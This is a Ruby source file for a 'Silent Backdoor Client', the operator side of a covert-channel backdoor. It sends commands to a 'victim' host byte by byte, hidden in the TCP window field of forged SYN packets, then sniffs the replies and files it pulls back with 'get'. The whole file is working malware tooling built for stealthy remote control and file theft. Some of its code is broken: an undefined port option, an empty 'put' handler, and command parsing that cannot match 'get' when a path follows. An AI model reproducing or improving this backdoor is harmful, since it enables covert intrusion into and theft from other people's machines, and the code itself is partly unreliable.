#!/usr/bin/env ruby

require 'rubygems'
require 'packetfu'
require 'base64'

# Local files
curdir = File.dirname(__FILE__);
require curdir + '/lib_trollop.rb'

#
#
#
@opts = Trollop::options do
    version "Silent Backdoor Client 1.0 2012(c) Karl Castillo"
    banner <<-EOS
    
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    ||==     ==     ===  ||  //  ||===     ===     ===    ||==
    ||  || ||  || ||     || //   ||   || ||   || ||   ||  ||  ||
    ||==   ||==|| ||     ||<<    ||   || ||   || ||   ||  ||==
    ||  || ||  || ||     || \\\\  ||   || ||   || ||   ||  || \\\\
    ||==   ||  ||   ===  ||  \\\\  ||===     ===     ===    ||  \\\\

                             v 1.0
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

2012(c) Karl Castillo

Usage:
    ruby backdoor.rb [options]

Where [options] are:
    EOS
    
    opt :host, "Victim IP Address", :short => "H", :type => :string, :default => "192.168.1.72" # string --host <s>, default 192.168.1.72
    opt :sport, "Victim Source Port", :short => "s", :default => 8000 # integer --sport <i>, default 8000
    opt :dport, "Victim Destination Port", :short => "d", :default => 8001 # integer --dport <i>, default 8001
    opt :iface, "Nic Device", :short => "i", :type => :string, :default => "wlan0" # string --iface <s>, default wlan0
    opt :key, "Secret Key", :short => "k", :type => :string, :default => "secretkey" # string --key <s>, default secretkey
end

def decode(hash)
    return Base64::decode64(hash)
end

def encode(hash)
    return Base64::encode64(hash)
end

def wait_cmd_response
    cap = PacketFu::Capture.new(:iface => @opts[:iface], :start => true,
                :promisc => true)
    response = ""
                
    cap.stream.each do |pkt|
        if PacketFu::TCPPacket.can_parse?(pkt) then
            packet = PacketFu::Packet.parse(pkt)
            if packet.tcp_dst == @opts[:dport]
                if packet.tcp_flags.fin == 1 then
                    puts response
                    return
                else
                    if response.nil? then
                        response = packet.tcp_win.chr
                    elsif
                        response << packet.tcp_win.chr
                    end # if
                end # fin
            end # port
        end # can_parse? 
    end # cap
end

def wait_get_response(cmd)
    cap = PacketFu::Capture.new(:iface => @opts[:iface], :start => true,
                :promisc => true)
    cmds = cmd.split(' ')
    filename = cmds[1].split('/').last
    
    file = File.open(filename, "wb")
    
    cap.stream.each do |pkt|
        if PacketFu::TCPPacket.can_parse?(pkt) then
            packet = PacketFu::Packet.parse pkt
            
            if packet.tcp_flags.fin == 1 then
                return
            elsif packet.tcp_dst == @opts[:lport] then
                file.write(packet.tcp_win)
            end
        end # can_parse?
    end # cap
end

def send_command(cmd, code)
    cfg = PacketFu::Utils.whoami?(:iface => @opts[:iface])
    #---------------------------------------------------------------------------
    # Send one byte at a time
    #---------------------------------------------------------------------------
    cmd.each_byte do |word|
        tcp = PacketFu::TCPPacket.new
        
        tcp.eth_saddr = cfg[:eth_saddr]
        tcp.tcp_src = rand(0xfff - 1024) + 1024
        tcp.tcp_dst = @opts[:sport]
        tcp.tcp_flags.syn = 1;
        tcp.tcp_win = word
        tcp.tcp_seq = rand(0xffff)
        tcp.ip_saddr = cfg[:ip_saddr]
        tcp.ip_daddr = @opts[:host] 
        
        tcp.recalc
        tcp.to_w(@opts[:iface])
    end

    #---------------------------------------------------------------------------
    # Send FIN packet
    #---------------------------------------------------------------------------
    tcp_fin = PacketFu::TCPPacket.new

    tcp_fin.eth_saddr = cfg[:eth_saddr]
    tcp_fin.tcp_src = rand(0xfff - 1024) + 1024
    tcp_fin.tcp_dst = @opts[:sport]
    tcp_fin.tcp_flags.fin = 1;
    tcp_fin.tcp_seq = rand(0xffff)
    tcp_fin.ip_saddr = cfg[:ip_saddr]
    tcp_fin.ip_daddr = @opts[:host]    

    tcp_fin.recalc
    tcp_fin.to_w(@opts[:iface])

    if code == 1 then # Regular Command
        wait_cmd_response
    elsif code == 2 then # Get Command
        wait_get_response(cmd)
    elsif code == 3 then # Put Command
    
    end 
end

#
#
#
def prompt
    while true do
        print "Enter Command > "
        cmd = gets.chomp
        cmds = cmd.split(' ', 1)
        
        if cmds[0] == "quit" or cmds[0] == "q" then # Quit
            abort("Quitting...")
        elsif cmds[0] == "get" or cmds[0] == "g" then # Get File
            send_command(cmd, 2)
        elsif cmds[0] == "put" or cmd[0] == "p" then # Put File
            send_command(cmd, 3)
        else # Generic Command            
            send_command(cmd, 1)
        end
    end
end

#
#
#
begin
    raise "Must run as root or `sudo ruby #{$0}`" unless Process.uid == 0

    prompt_thread = Thread.new { prompt }
    prompt_thread.join
    
    rescue Interrupt
    
    Thread.kill(prompt_thread)
end
